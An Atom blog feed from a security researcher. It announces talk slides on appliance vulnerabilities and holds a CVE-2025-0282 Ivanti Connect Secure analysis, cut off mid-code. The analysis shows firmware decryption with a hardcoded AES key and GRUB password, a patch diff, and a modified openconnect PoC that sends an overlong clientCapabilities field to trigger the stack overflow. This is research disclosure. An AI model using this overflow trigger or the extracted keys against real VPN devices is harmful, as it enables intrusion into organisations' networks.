<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Swing&#39;Blog 浮生若梦</title>
  
  <subtitle>努力是为了 站在万人中央 成为别人的光</subtitle>
  <link href="https://bestwing.me/atom.xml" rel="self"/>
  
  <link href="https://bestwing.me/"/>
  <updated>2025-04-01T03:33:08.175Z</updated>
  <id>https://bestwing.me/</id>
  
  <author>
    <name>Swing</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>议题分享： 企业设备安全设备漏洞分析与利用</title>
    <link href="https://bestwing.me/Security-Equipment-Vulnerability-Research.html"/>
    <id>https://bestwing.me/Security-Equipment-Vulnerability-Research.html</id>
    <published>2025-03-31T16:00:00.000Z</published>
    <updated>2025-04-01T03:33:08.175Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>…</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个议题内容在 2024年10月10日的华为 “安全光网”网络安全技术论坛和 2024年11月9日的先知沙龙-北京站分享过。</p><p>当时北京沙龙为了篇幅砍了很多 slide 的页数， 这次分享是<strong>比较</strong>完整的 95 页（ 做太多了…), 主要的内容是从各个类型的安全设备切入，分析他们的攻击面以及一些公开的 1day的漏洞分析， 主要大纲如下：</p><ol><li>安全邮件网关</li><li>网关</li><li>防火墙</li><li>VPN设备</li></ol><h2 id="公开-slide"><a href="#公开-slide" class="headerlink" title="公开 slide"></a>公开 slide</h2><p>这里公开 slide ， 感兴趣的同学可以自行阅读</p><div class="row"><iframe src="https://drive.google.com/file/d/1W6kVh6zJ-R61WR69xX7V02mmESTuwPJO/preview" style="width:100%; height:550px"></iframe></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="VPN" scheme="https://bestwing.me/tags/VPN/"/>
    
    <category term="Mail" scheme="https://bestwing.me/tags/Mail/"/>
    
    <category term="Gateway" scheme="https://bestwing.me/tags/Gateway/"/>
    
    <category term="Firewall" scheme="https://bestwing.me/tags/Firewall/"/>
    
    <category term="“安全光网”网络安全技术论坛" scheme="https://bestwing.me/tags/%E2%80%9C%E5%AE%89%E5%85%A8%E5%85%89%E7%BD%91%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E8%AE%BA%E5%9D%9B/"/>
    
    <category term="先知沙龙-北京站" scheme="https://bestwing.me/tags/%E5%85%88%E7%9F%A5%E6%B2%99%E9%BE%99-%E5%8C%97%E4%BA%AC%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>Vigor2960 Memoirs &#92;nPursuit of the Elusive 0day &amp; 1day</title>
    <link href="https://bestwing.me/Vigor2960-Memoirs-Pursuit-of-the-Elusive.html"/>
    <id>https://bestwing.me/Vigor2960-Memoirs-Pursuit-of-the-Elusive.html</id>
    <published>2025-03-06T16:00:00.000Z</published>
    <updated>2025-03-07T08:02:54.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>…</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2024年9月因为<strong>360车联网安全研究院副院长曹颖杰</strong>的关系，受到邀请去了长沙信息物理系统安全技术沙龙水了一个议题，主要是之前对 draytek 2960的漏洞挖掘回顾和一个囤了很久，但是后面被修了的一个漏洞部分详情披露。（PS 这个洞的逻辑后来我出成了华为CTF的某个Pwn题）</p><h2 id="公开-slide"><a href="#公开-slide" class="headerlink" title="公开 slide"></a>公开 slide</h2><p>这里公开 PPT ， 感兴趣的同学可以自行阅读</p><div class="row"><iframe src="https://drive.google.com/file/d/1OW0Ntw7V07n3bdnUyWU2zBuXV82QDLSO/preview" style="width:100%; height:550px"></iframe></div><p>说起来这个洞，之前就已经有个大哥在他博客也提到了，还是太容易被发现了。另外感叹一句长沙还是挺好玩的。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="DrayTek" scheme="https://bestwing.me/tags/DrayTek/"/>
    
    <category term="Vigor2960" scheme="https://bestwing.me/tags/Vigor2960/"/>
    
    <category term="长沙CPS" scheme="https://bestwing.me/tags/%E9%95%BF%E6%B2%99CPS/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2025-0282 Ivanti Connect Secure VPN 栈溢出漏洞分析</title>
    <link href="https://bestwing.me/CVE-2025-0282-Ivanti-Connect-Secure-VPN-stack-overflow.html"/>
    <id>https://bestwing.me/CVE-2025-0282-Ivanti-Connect-Secure-VPN-stack-overflow.html</id>
    <published>2025-01-28T16:00:00.000Z</published>
    <updated>2025-01-28T16:23:21.055Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>…</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>2025年（暨蛇年）第一篇博客文章，顺便祝我的博客读者新春快乐吧。</p><p>1月9日 google 发布的 Ivanti Connect Secure VPN 设备的在野漏洞预警：</p><p><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day/">https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day/</a></p><p>1月10日 watchtowr 就发布了漏洞分析</p><p><a href="https://labs.watchtowr.com/do-secure-by-design-pledges-come-with-stickers-ivanti-connect-secure-rce-cve-2025-0282/">https://labs.watchtowr.com/do-secure-by-design-pledges-come-with-stickers-ivanti-connect-secure-rce-cve-2025-0282/</a></p><p>1月10日我也发了我的漏洞复现推特： <a href="https://x.com/bestswngs/status/1877715807506952486">https://x.com/bestswngs/status/1877715807506952486</a></p><p>这次 diff版本2.3 build 3431 和 2.5， 特意留到了除夕夜发这篇文章..</p><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p>这部分内容依旧感谢我的同事 @explore 和 @leommxj的帮助， 具体流程如下：</p><p>添加磁盘到虚拟机里后， 用 <code>lvdisplay</code> 可以看到几个分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># lvdisplay</span></span><br><span class="line">  --- Logical volume ---</span><br><span class="line">  LV Path                /dev/groupA/home</span><br><span class="line">  LV Name                home</span><br><span class="line">  VG Name                groupA</span><br><span class="line">  LV UUID                vPWDHH-AlTq-GvBS-UAnf-orT1-yT2d-TdbWyK</span><br><span class="line">  LV Write Access        <span class="built_in">read</span>/write</span><br><span class="line">  LV Creation host, time (none), 2025-01-09 17:28:21 -0500</span><br><span class="line">  LV Status              NOT available</span><br><span class="line">  LV Size                &lt;4.87 GiB</span><br><span class="line">  Current LE             1246</span><br><span class="line">  Segments               1</span><br><span class="line">  Allocation             inherit</span><br><span class="line">  Read ahead sectors     auto</span><br><span class="line">   </span><br><span class="line">  --- Logical volume ---</span><br><span class="line">  LV Path                /dev/groupA/runtime</span><br><span class="line">  LV Name                runtime</span><br><span class="line">  VG Name                groupA</span><br><span class="line">  LV UUID                dFDVOl-kYQR-J3N5-3HNC-toXc-9947-sj0yzc</span><br><span class="line">  LV Write Access        <span class="built_in">read</span>/write</span><br><span class="line">  LV Creation host, time (none), 2025-01-09 17:28:39 -0500</span><br><span class="line">  LV Status              NOT available</span><br><span class="line">  LV Size                &lt;19.46 GiB</span><br><span class="line">  Current LE             4981</span><br><span class="line">  Segments               2</span><br><span class="line">  Allocation             inherit</span><br><span class="line">  Read ahead sectors     auto</span><br><span class="line">   </span><br><span class="line">  --- Logical volume ---</span><br><span class="line">  LV Path                /dev/groupZ/home</span><br><span class="line">  LV Name                home</span><br><span class="line">  VG Name                groupZ</span><br><span class="line">  LV UUID                cOTBS1-oaYw-PlAt-puTS-Uvq5-6C91-pK6QHK</span><br><span class="line">  LV Write Access        <span class="built_in">read</span>/write</span><br><span class="line">  LV Creation host, time (none), 2024-10-07 06:47:49 -0400</span><br><span class="line">  LV Status              NOT available</span><br><span class="line">  LV Size                6.72 GiB</span><br><span class="line">  Current LE             1721</span><br><span class="line">  Segments               1</span><br><span class="line">  Allocation             inherit</span><br><span class="line">  Read ahead sectors     auto</span><br></pre></td></tr></table></figure><p>可以看到这几个都是 lvm2 加密的， 没法直接 mount</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># fdisk -l</span></span><br><span class="line">Disk /dev/sdb: 80.09 GiB, 86000000000 bytes, 167968750 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0xc45d0b27</span><br><span class="line"></span><br><span class="line">Device     Boot Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sdb1  *     2048 167968749 167966702 80.1G 83 Linux</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 80 GiB, 85899345920 bytes, 167772160 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">Device     Boot     Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1           16065    224909    208845  102M 83 Linux</span><br><span class="line">/dev/sda2          224910    433754    208845  102M 83 Linux</span><br><span class="line">/dev/sda3          449820    658664    208845  102M 83 Linux</span><br><span class="line">/dev/sda4          674730 167766794 167092065 79.7G 85 Linux extended</span><br><span class="line">/dev/sda5          674731  14779799  14105069  6.7G 83 Linux</span><br><span class="line">/dev/sda6        14779801  30089744  15309944  7.3G 83 Linux</span><br><span class="line">/dev/sda7        30089746  65802239  35712494   17G 83 Linux</span><br><span class="line">/dev/sda8        65802241  81112184  15309944  7.3G 83 Linux</span><br><span class="line">/dev/sda9        81112186 116824679  35712494   17G 83 Linux</span><br><span class="line">/dev/sda10      116824681 132134624  15309944  7.3G 82 Linux swap / Solaris</span><br><span class="line">/dev/sda11      132134626 167766794  35632169   17G 83 Linux</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># mount /dev/groupZ/home /mnt/runtime</span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># mount /dev/sda1 /mnt/runtime       </span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># ls /mnt/runtime </span></span><br><span class="line">boot.b  compact-file  coreboot.img  disksize  grub  kernel  log_coreboot  lost+found  VERSION</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们在 <code>/dev/sda1</code> 找到了对应的 <code>kernel</code> 和 <code>coreboot.img</code>， 可以看看到 coreboot.img 作为initrd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># cat /mnt/runtime/grub/grub.cfg </span></span><br><span class="line"><span class="built_in">set</span> default=0</span><br><span class="line"><span class="built_in">set</span> timeout=5</span><br><span class="line">insmod ext2</span><br><span class="line">password 07ow3w3d743</span><br><span class="line">serial --unit=0 --speed=9600 --word=8 --parity=no --stop=1</span><br><span class="line">menuentry <span class="string">&quot;Current&quot;</span> &#123;</span><br><span class="line"><span class="built_in">set</span> root=(hd0,2)</span><br><span class="line">    linux /kernel system=A rootdelay=5 console=ttyS0,115200n8 console=tty0 vm_hv_type=VMware   </span><br><span class="line">    initrd /coreboot.img</span><br><span class="line">&#125;</span><br><span class="line">menuentry <span class="string">&quot;Factory Reset&quot;</span> &#123;</span><br><span class="line"><span class="built_in">set</span> root=(hd0,1)</span><br><span class="line">    linux /kernel system=Z noconfirm rootdelay=5 console=ttyS0,115200n8 console=tty0 vm_hv_type=VMware   </span><br><span class="line">    initrd /coreboot.img</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h3><p>coreboot.img 作为initrd</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-21-ee05dc473ae5764c7ab74ac2a110f46a-38fd2f.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-21-ee05dc473ae5764c7ab74ac2a110f46a-38fd2f.png" alt="image.png"></a></p><p>我们去将这里的 kernel 通过 vmlinux-to-elf 转换一下就可以逆向了， 在 kernel中<code>populate_rootfs</code>里面写死密钥的AES解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>DRAMFS_AES_KEY = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;13D7B32E2600B7747D80FBA8F8D5C7CA&quot;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>realkey = strxor(DRAMFS_AES_KEY[:<span class="number">4</span>][::-<span class="number">1</span>], <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;99ED2BF2&#x27;</span>))[::-<span class="number">1</span>]</span><br><span class="line">  <span class="number">2</span> realkey += strxor(DRAMFS_AES_KEY[<span class="number">4</span>:<span class="number">8</span>][::-<span class="number">1</span>], <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;AEEF41FE&#x27;</span>))[::-<span class="number">1</span>]</span><br><span class="line">  <span class="number">3</span> realkey += strxor(DRAMFS_AES_KEY[<span class="number">8</span>:<span class="number">12</span>][::-<span class="number">1</span>], <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;141058C7&#x27;</span>))[::-<span class="number">1</span>]</span><br><span class="line">  <span class="number">4</span> realkey += strxor(DRAMFS_AES_KEY[<span class="number">12</span>:<span class="number">16</span>][::-<span class="number">1</span>], <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;D2ED180E&#x27;</span>))[::-<span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>realkey</span><br><span class="line"><span class="string">b&#x27;\xe1\xfc^\xb7\xd8AX\xda\xba\xd8\xeb\xbc\xf6\xcd*\x18&#x27;</span></span><br></pre></td></tr></table></figure><p>binary ninja 带有神奇的优化，<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-21-fb9e3ca218c682ba175b92611e4cb934-dbe415.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-21-fb9e3ca218c682ba175b92611e4cb934-dbe415.png" alt="image.png"></a><br>优化出来就是异或完的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ffffffff826d0815            <span class="keyword">int64_t</span> initrd_start_3 = initrd_start;</span><br><span class="line">ffffffff826d081c            <span class="keyword">int32_t</span> initrd_end_1 = (*(<span class="keyword">uint32_t</span>*)initrd_end);</span><br><span class="line">ffffffff826d082e            <span class="keyword">int64_t</span>* rax_1 = crypto_alloc_base(<span class="string">&quot;aes&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">ffffffff826d0833            <span class="keyword">uint64_t</span> i = (<span class="keyword">uint64_t</span>)(initrd_end_1 - initrd_start_3);</span><br><span class="line">ffffffff826d083f            <span class="keyword">int64_t</span> rcx_1;</span><br><span class="line">ffffffff826d083f            <span class="keyword">int64_t</span> rdx_1;</span><br><span class="line">ffffffff826d083f            <span class="keyword">int64_t</span> r8_1;</span><br><span class="line">ffffffff826d083f            </span><br><span class="line"><span class="function">ffffffff826d083f            <span class="title">if</span> <span class="params">(rax_1 &lt;= <span class="number">-0x1000</span>)</span></span></span><br><span class="line"><span class="function">ffffffff826d083f            </span>&#123;</span><br><span class="line">ffffffff826d0875                <span class="keyword">int32_t</span> var_6c_1 = <span class="number">0xda5841d8</span>;</span><br><span class="line">ffffffff826d0889                <span class="keyword">int32_t</span> var_70 = <span class="number">0xb75efce1</span>;</span><br><span class="line">ffffffff826d088c                <span class="keyword">int32_t</span> var_68_1 = <span class="number">0xbcebd8ba</span>;</span><br><span class="line">ffffffff826d088f                <span class="keyword">int32_t</span> var_64_1 = <span class="number">0x182acdf6</span>;</span><br><span class="line">ffffffff826d089b                rcx_1 = rax_1[<span class="number">1</span>](rax_1, &amp;var_70, <span class="number">0x10</span>);</span><br><span class="line">ffffffff826d089f                <span class="keyword">int32_t</span> rax_2 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>通过简单的逆向， 我们很快就可以写出一份解密代码， 我们可以把 coreboot.img 解密后出来一份<code>gzip</code> 压缩的cpio文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ sw in ~/Dropbox/Attachments/SafetyEquipment/VPN/ivc/2.3 [17:53:53]</span></span><br><span class="line">$ file out2.bak</span><br><span class="line">out2.bak: gzip compressed data, last modified: Sat Oct  5 17:32:45 2024, max compression, from Unix, original size modulo 2^32 118361088</span><br><span class="line"></span><br><span class="line"><span class="comment"># swing @ sw in ~/Dropbox/Attachments/SafetyEquipment/VPN/ivc/2.3 [17:53:49]</span></span><br><span class="line">$ gzip -d out2.gz</span><br><span class="line"></span><br><span class="line">$ file out2</span><br><span class="line">out2: ASCII cpio archive (SVR4 with no CRC)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cpio 解出来的目录结构如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ sw in ~/Dropbox/Attachments/SafetyEquipment/VPN/ivc/2.3/initrd [17:55:34]</span></span><br><span class="line">$ ls</span><br><span class="line">bin     dash    dev     etc     gzip    insmod  lib     modules out2    rmmod   sbin    tmp     usr</span><br></pre></td></tr></table></figure><p><code>etc/lvmeky</code> 是其他上面几个  lvm 分区的 key , 使用 <code>crypsetup</code> 命令解密后可以进一步 mount 磁盘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cryptsetup luksOpen --key-file /mnt/hgfs/G/chaitin/20250109_ivanti/ISA_R2.3/lvmkey /dev/groupA/home groupA_home</span><br><span class="line">sudo mount /dev/mapper/groupA_home /mnt/disk1</span><br></pre></td></tr></table></figure><h3 id="shell-获取"><a href="#shell-获取" class="headerlink" title="shell 获取"></a>shell 获取</h3><p>/root/home/bin/dsconfig.pl 是进入后的shell<br>其中如果<code>DSSys::isDebugBuild</code> 返回是调试版本就会直接给出shell的选项</p><p>这里就是会调用  <code>sub shell &#123;&#125;</code> 方法</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">shell</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span> <span class="keyword">if</span> (!DSSys::isDebugBuild());</span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;set DISPLAY variable if you want to start an xterm\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">my</span> ($install) = $ENV&#123;<span class="string">&#x27;DSINSTALL&#x27;</span>&#125; =~ <span class="regexp">/(\S*)/</span>;</span><br><span class="line">  DSSafe::<span class="keyword">system</span>(<span class="string">&quot;$install/bin/dsshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过简单逆向这个程序，我们就很快能获得一个带有调试功能的固件了（具体操作留给读者了， 很简单）</p><h2 id="CVE-2025-0282"><a href="#CVE-2025-0282" class="headerlink" title="CVE-2025-0282"></a>CVE-2025-0282</h2><h3 id="Diff-patched"><a href="#Diff-patched" class="headerlink" title="Diff patched"></a>Diff patched</h3><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-10-480e76fc9ceffe7595e688e3b80f371d-215ea6.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-10-480e76fc9ceffe7595e688e3b80f371d-215ea6.png" alt="image.png"></a></p><p>可以看到这里新加了一个长度判断， 之前存在栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line"><span class="built_in">strncpy</span>(dest, *(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">140</span>), v23);</span><br><span class="line">v24 = <span class="number">46</span>;</span><br><span class="line">v25 = &amp;v57;</span><br><span class="line"><span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)&amp;v57 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  LOBYTE(v24) = <span class="number">44</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v25 = (__int16 *)&amp;v58;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>最早的poc构造是根据 watchtowr 的文章， 魔改 openconnect<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="OpenConnect https://www.infradead.org/openconnect/download.html">[1]</span></a></sup> 的 <code>pulse.c</code> 代码</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (bytes[0])</span><br><span class="line">        buf_append(reqbuf, &quot; clientIp=%s&quot;, bytes);</span><br><span class="line"><span class="addition">+ buf_append(reqbuf, &quot; clientCapabilities=%s&quot;, bytes);</span></span><br><span class="line"><span class="addition">+ for(unsigned int n=0; n&lt;100; n++)</span></span><br><span class="line"><span class="addition">+       buf_append(reqbuf, &quot;AAAAAAAAAAAAAAAA&quot;);</span></span><br><span class="line">buf_append(reqbuf, &quot;\\n%c&quot;, 0);</span><br><span class="line">ret = send_ift_packet(vpninfo, reqbuf);</span><br></pre></td></tr></table></figure><p>编译的时候需要一个 vpn.cript , 我这里用的是 <a href="https://gitlab.com/openconnect/vpnc-scripts/-/blob/master/vpnc-script?ref_type=heads">https://gitlab.com/openconnect/vpnc-scripts/-/blob/master/vpnc-script?ref_type=heads</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/configure --enable-static=yes --without-openssl --with-vpnc-script=./vpnc-script --without-libproxy --without-lz4</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 